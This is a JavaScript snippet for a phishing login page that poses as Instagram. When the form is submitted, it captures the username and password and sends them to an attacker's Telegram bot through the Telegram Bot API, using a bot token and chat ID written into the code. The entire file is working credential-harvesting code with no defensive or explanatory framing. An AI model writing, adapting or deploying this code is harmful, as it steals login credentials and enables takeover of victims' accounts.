document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Replace with your Telegram bot API key and chat ID
    const telegramBotApiKey = '8890809901:AAEja8I5j0aBUWUwDGLdRN2uLuSHoK-yvXc';
    const telegramChatId = '8596970646';

    fetch(`https://api.telegram.org/bot${telegramBotApiKey}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: telegramChatId,
            text: `New Instagram login:\nUsername: ${username}\nPassword: ${password}`
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
            alert('Login information sent to your Telegram bot!');
        } else {
            alert('Failed to send login information to your Telegram bot.');
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while sending the login information.');
    });
});
